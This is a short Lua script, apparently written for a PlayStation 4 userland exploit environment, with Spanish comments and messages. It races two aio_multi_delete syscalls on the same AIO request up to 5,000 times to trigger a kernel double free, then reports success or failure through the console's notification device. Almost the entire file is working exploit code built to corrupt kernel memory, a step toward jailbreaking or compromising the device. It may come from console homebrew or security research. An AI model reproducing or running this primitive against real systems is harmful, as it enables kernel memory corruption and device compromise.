-- Syscall IDs
local SYS_AIO_SUBMIT_CMD = 0x29D
local SYS_AIO_MULTI_WAIT = 0x297
local SYS_AIO_MULTI_DELETE = 0x296
local SYS_OPEN = 5
local SYS_WRITE = 4
local SYS_CLOSE = 6

-- AIO constants
local SCE_KERNEL_AIO_CMD_WRITE = 0x002
local SCE_KERNEL_AIO_CMD_MULTI = 0x1000
local SCE_KERNEL_AIO_PRIORITY_HIGH = 3
local SCE_KERNEL_AIO_WAIT_AND = 0x01

-- Syscall resolution
syscall.resolve({
    aio_submit_cmd = SYS_AIO_SUBMIT_CMD,
    aio_multi_wait = SYS_AIO_MULTI_WAIT,
    aio_multi_delete = SYS_AIO_MULTI_DELETE,
    open = SYS_OPEN,
    write = SYS_WRITE,
    close = SYS_CLOSE,
})

-- Notification helper
function notify(msg)
    pcall(function()
        local O_WRONLY = 1
        local notify_buffer_size = 0xc30
        local notify_buffer = bump.alloc(notify_buffer_size)
        local icon_uri = "cxml://psnotification/internal/icon_notification_info"

        memory.write_dword(notify_buffer + 0, 0)
        memory.write_dword(notify_buffer + 0x28, 0)
        memory.write_dword(notify_buffer + 0x2C, 1)
        memory.write_dword(notify_buffer + 0x10, -1)
        memory.write_buffer(notify_buffer + 0x2D, msg .. "\0")
        memory.write_buffer(notify_buffer + 0x42D, icon_uri)

        local fd = syscall.open("/dev/notification0", O_WRONLY):tonumber()
        if fd >= 0 then
            syscall.write(fd, notify_buffer, notify_buffer_size)
            syscall.close(fd)
        end
    end)
end

-- Settings
local num_reqs = 3
local which_req = 0
local iterations = 100

function alloc_requests()
    local size = 0x20
    local base = bump.alloc(num_reqs * size)
    for i = 0, num_reqs - 1 do
        local addr = base + i * size
        memory.write_dword(addr + 0x14, -1) -- fd = -1
    end
    return base
end

function alloc_int_array(count)
    return bump.alloc(count * 4)
end

function double_free_test()
    local reqs = alloc_requests()
    local ids = alloc_int_array(num_reqs)
    local sce_errs = alloc_int_array(num_reqs)
    local race_errs = alloc_int_array(2)

    for i = 1, 5000 do
        

        syscall.aio_submit_cmd(
            SCE_KERNEL_AIO_CMD_WRITE + SCE_KERNEL_AIO_CMD_MULTI,
            reqs,
            num_reqs,
            SCE_KERNEL_AIO_PRIORITY_HIGH,
            ids
        )

        syscall.aio_multi_wait(ids, num_reqs, sce_errs, SCE_KERNEL_AIO_WAIT_AND, 0)

        syscall.aio_multi_delete(ids + which_req * 4, 1, race_errs + 4)

        for _ = 1, 1000 do end -- pequeño bucle de delay

        syscall.aio_multi_delete(ids + which_req * 4, 1, race_errs)

        local err0 = memory.read_dword(race_errs):tonumber()
        local err1 = memory.read_dword(race_errs + 4):tonumber()

        print(string.format("Errores: 0x%X | 0x%X", err0, err1))

        if err0 == err1 then
            print("Double Free archivado!")
            notify("✅ Double Free PS4 Archivado con exito!")
            return
        end
    end

    print("Double Free fallido")
    notify("❌ Double Free Fallido")
end



double_free_test()
